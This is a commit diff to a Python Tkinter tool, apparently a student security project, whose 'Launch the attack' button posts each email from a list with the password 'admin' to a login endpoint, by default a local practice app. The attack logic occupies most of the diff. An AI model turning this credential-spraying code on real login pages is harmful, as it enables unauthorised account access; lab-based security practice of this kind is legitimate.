d64b313f2dfa85cce52b36db74c0c259797574ed
Alexandre Piel <alpi10533@eleve.isep.fr>
2024-01-18 14:04:34 +0100

    small change

--- GUI/sql_injection.py
+++ GUI/sql_injection.py
@@ -1,7 +1,8 @@
 from tkinter import Frame, Label, Entry, Button, Text
-from selenium import webdriver
 
 import os
+import requests
+import threading
 
 
 class SQLInjection(Frame):
@@ -14,18 +15,17 @@ class SQLInjection(Frame):
         Label(self, text="Login URL:").pack()
         self.login_url_entry = Entry(self)
         self.login_url_entry.pack()
+        self.login_url_entry.insert("insert", "http://localhost:3000/rest/user/login")
 
-        Label(self, text="Email XPath:").pack()
-        self.email_xpath_entry = Entry(self)
-        self.email_xpath_entry.pack()
+        Label(self, text="Email field name:").pack()
+        self.email_field_name_entry = Entry(self)
+        self.email_field_name_entry.pack()
+        self.email_field_name_entry.insert("insert", "email")
 
-        Label(self, text="Password XPath:").pack()
-        self.password_xpath_entry = Entry(self)
-        self.password_xpath_entry.pack()
-
-        Label(self, text="Confirm XPath:").pack()
-        self.confirm_xpath_entry = Entry(self)
-        self.confirm_xpath_entry.pack()
+        Label(self, text="Password field name:").pack()
+        self.password_field_name_entry = Entry(self)
+        self.password_field_name_entry.pack()
+        self.password_field_name_entry.insert("insert", "password")
 
         self.result_text = Text(self)
         self.result_text.pack()
@@ -33,55 +33,42 @@ class SQLInjection(Frame):
         Button(self, text="Launch the attack", command=self.launch_attack).pack()
 
     def launch_attack(self):
+        thread = threading.Thread(target=lambda: self.attack())
+        thread.start()
+
+    def attack(self):
+
+        self.result_text.delete('1.0', 'end')
+
+        self.result_text.insert('end', "---- START ----\n\n")
 
         directory_path = os.path.dirname(os.path.realpath(__file__))
 
         emails_path = os.path.join(directory_path, '../Resources/SQL Injection/emails.txt')
-        passwords_path = os.path.join(directory_path, '../Resources/SQL Injection/passwords.txt')
 
         with open(emails_path, 'r') as f:
             emails = [line.strip() for line in f]
 
-        with open(passwords_path, 'r') as f:
-            passwords = [line.strip() for line in f]
-        
-        self.result_text.delete('1.0', 'end')
+        password = 'admin'
 
-        success_counter = 0
-        fail_counter = 0
+        successes_counter = 0
+        fails_counter = 0
 
-        driver = webdriver.Chrome()
-
-        for i in range(0, len(emails)):
-
-            start_url = self.login_url_entry.get()
-
-            email = emails[i]
-            password = passwords[i]
-
-            driver.get(start_url)
-
-            email_element = driver.find_element_by_xpath(self.email_xpath_entry.get())
-            password_element = driver.find_element_by_xpath(self.password_xpath_entry.get())
-            confirm_element = driver.find_element_by_xpath(self.confirm_xpath_entry.get())
-
-            email_element.clear()
-            email_element.send_keys(emails[i])
-
-            password_element.clear()
-            password_element.send_keys(passwords[i])
-
-            confirm_element.click()
-
-            end_url = driver.current_url
-
-            if start_url != end_url:
+        for email in emails:
+            data = {
+                self.email_field_name_entry.get(): email,
+                self.password_field_name_entry.get(): password
+            }
+            response = requests.post(self.login_url_entry.get(), data=data)
+            if response.status_code == 200:
                 message = "Success"
-                success_counter += 1
+                successes_counter += 1
             else:
-                message = "Failed"
-                fail_counter += 1
+                message = "Fail"
+                fails_counter += 1
+    
+            self.result_text.insert('end', f"{message} with username: {email}, password: {password}\n")
 
-            self.result_text.insert('end', f"{message} with email: {email}, password: {password}\n")
+        self.result_text.insert('end', f"\nSummary:\n - Successes: {successes_counter}\n - Fails: {fails_counter}\n")
 
-        self.result_text.insert('end', f"\nSummary:\nSuccesses: {success_counter}\nFailures: {fail_counter}\n")
+        self.result_text.insert('end', "\n---- END ----")
